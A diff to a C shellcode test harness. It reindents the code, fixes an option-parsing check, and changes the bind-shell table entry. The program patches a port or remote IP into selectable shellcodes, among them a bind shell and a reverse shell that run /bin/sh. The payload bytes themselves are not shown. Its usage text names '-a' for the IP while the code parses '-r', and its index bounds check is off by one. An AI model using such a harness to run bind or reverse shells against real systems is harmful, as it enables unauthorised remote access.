@@ -130,7 +130,7 @@ sc_t codes[]=
    RS,  RS_SIZE, RS_PORT_OFS, RS_IP_OFS },
    
  {"socket(), bind(), listen(), accept(), execve(\"/bin/sh\")",  
-   BS,  BS_SIZE, BS_PORT_OFS, BS_IP_OFS }
+   BS,  BS_SIZE, BS_PORT_OFS, 0 }
 };  
 
 void xcode(int idx, char *cmd, int port_nbr, u_long ip)
@@ -187,126 +187,126 @@ void xcode(int idx, char *cmd, int port_nbr, u_long ip)
 }
 
 void usage(void) {
-  int i;
-  
-  printf ("\n  Target OS: %s", TARGET);
+    int i;
+    
+    printf ("\n  Target OS: %s", TARGET);
 
-  printf ("\n  usage: test -s <number> -p <port> -a <ip address> -c <command>\n");
-  printf ("\n  -c <command>  Command to execute");
-  printf ("\n  -s <number>   Shellcode to execute (see table below)");
-  printf ("\n  -p <port>     Port to use to bind/reverse shell (default is 1234)");
-  printf ("\n  -a <ip>       Remote ipv4 address for reverse shell (default is localhost)\n\n");
-  
-  printf ("  %-6s  %-55s  %s\n", 
-      "Number", "Description", "Size");
+    printf ("\n  usage: test -s <number> -p <port> -a <ip address> -c <command>\n");
+    printf ("\n  -c <command>  Command to execute");
+    printf ("\n  -s <number>   Shellcode to execute (see table below)");
+    printf ("\n  -p <port>     Port to use to bind/reverse shell (default is 1234)");
+    printf ("\n  -a <ip>       Remote ipv4 address for reverse shell (default is localhost)\n\n");
+    
+    printf ("  %-6s  %-55s  %s\n", 
+        "Number", "Description", "Size");
 
-  printf ("  %-6s  %-55s  %s\n", 
-      "======", "===========", "========");
-      
-  for (i=0; i<sizeof(codes)/sizeof(sc_t); i++) {
-    printf ("  %-6i  %-55s  %i bytes\n", i, 
-        codes[i].description, codes[i].code_len);
-  }
-  putchar('\n');
-  exit(0);
+    printf ("  %-6s  %-55s  %s\n", 
+        "======", "===========", "========");
+        
+    for (i=0; i<sizeof(codes)/sizeof(sc_t); i++) {
+      printf ("  %-6i  %-55s  %i bytes\n", i, 
+          codes[i].description, codes[i].code_len);
+    }
+    putchar('\n');
+    exit(0);
 }
 
 /**F*****************************************************************/
 char* getparam (int argc, char *argv[], int *i)
 {
-  int n=*i;
-  if (argv[n][2] != 0) {
-    return &argv[n][2];
-  }
-  if ((n+1) < argc) {
-    *i=n+1;
-    return argv[n+1];
-  }
-  printf ("[ %c%c requires parameter\n", argv[n][0], argv[n][1]);
-  exit (0);
+    int n=*i;
+    if (argv[n][2] != 0) {
+      return &argv[n][2];
+    }
+    if ((n+1) < argc) {
+      *i=n+1;
+      return argv[n+1];
+    }
+    printf ("[ %c%c requires parameter\n", argv[n][0], argv[n][1]);
+    exit (0);
 }
 
 int main(int argc, char *argv[])
 {
-  int    i, port_nbr=0, sc=0;
-  u_long ip=0;
-  char   opt;
-  char   *port=NULL, *address=NULL, *cmd=NULL;
+    int    i, port_nbr=0, sc=0;
+    u_long ip=0;
+    char   opt;
+    char   *port=NULL, *address=NULL, *cmd=NULL;
 
-  #ifdef WIN
-  WSADATA wsa;
+    #ifdef WIN
+    WSADATA wsa;
 
-  WSAStartup(MAKEWORD(2,0), &wsa);
-  #endif
-  
-  // for each argument
-  for (i=1; i<argc; i++)
-  {
-    // is this option?
-    if (argv[i][0]=='-' || argv[i][1]=='/')
+    WSAStartup(MAKEWORD(2,0), &wsa);
+    #endif
+    
+    // for each argument
+    for (i=1; i<argc; i++)
     {
-      // get option value
-      opt=argv[i][1];
-      switch (opt)
+      // is this option?
+      if (argv[i][0]=='-' || argv[i][0]=='/')
       {
-        case 'c':
-          cmd=getparam(argc, argv, &i);
-          break;
-        case 'r':     // remote ip address
-          address=getparam(argc, argv, &i);
-          break;
-        case 's':     // shellcode number
-          sc=atoi(getparam(argc, argv, &i)) + 1;
-          break;
-        case 'p':     // port number
-          port=getparam(argc, argv, &i);
-          break;
-        case '?':     // display usage
-        case 'h':
-          usage ();
-          break;
-        default:
-          printf ("[ unknown option %c\n", opt);
-          usage();
-          break;
+        // get option value
+        opt=argv[i][1];
+        switch (opt)
+        {
+          case 'c':
+            cmd=getparam(argc, argv, &i);
+            break;
+          case 'r':     // remote ip address
+            address=getparam(argc, argv, &i);
+            break;
+          case 's':     // shellcode number
+            sc=atoi(getparam(argc, argv, &i)) + 1;
+            break;
+          case 'p':     // port number
+            port=getparam(argc, argv, &i);
+            break;
+          case '?':     // display usage
+          case 'h':
+            usage ();
+            break;
+          default:
+            printf ("[ unknown option %c\n", opt);
+            usage();
+            break;
+        }
       }
     }
-  }
-  
-  // no parameters?
-  if (sc==0) usage();
-  
-  sc--;
-  
-  // invalid shellcode selected?
-  if (sc < 0 || sc > sizeof(codes)/sizeof(sc_t)) {
-    printf ("\n  invalid shellcode number");
-    return 0;
-  }
-  
-  // check if cmd
-  if (sc==CMD_IDX && cmd==NULL) {
-    printf ("\n  no command line specified\n");
-    return 0;
-  }
-  // check port number if provided
-  if (port!=NULL) {
-    port_nbr = atoi(port);
-    if (port_nbr<=0 || port_nbr>65535) {
-      printf ("\n  invalid port number");
+    
+    // no parameters?
+    if (sc==0) usage();
+    
+    sc--;
+    
+    // invalid shellcode selected?
+    if (sc < 0 || sc > sizeof(codes)/sizeof(sc_t)) {
+      printf ("  invalid shellcode number\n");
       return 0;
     }
-    port_nbr = htons(port_nbr);
-  }
-  
-  // check ip address if provided
-  if (address!=NULL) {
-    ip = inet_addr(address);
-    if (ip==0 || ip==~0UL) {
-      printf("\n  invalid ip address");
+    
+    // check if cmd
+    if (sc==CMD_IDX && cmd==NULL) {
+      printf ("  no command line specified\n");
       return 0;
     }
-  }
-  xcode (sc, cmd, port_nbr, ip);
-  return 0;
+    // check port number if provided
+    if (port!=NULL) {
+      port_nbr = atoi(port);
+      if (port_nbr<=0 || port_nbr>65535) {
+        printf ("  invalid port number\n");
+        return 0;
+      }
+      port_nbr = htons(port_nbr);
+    }
+    
+    // check ip address if provided
+    if (address!=NULL) {
+      ip = inet_addr(address);
+      if (ip==0 || ip==~0UL) {
+        printf("  invalid ip address\n");
+        return 0;
+      }
+    }
+    xcode (sc, cmd, port_nbr, ip);
+    return 0;
 }
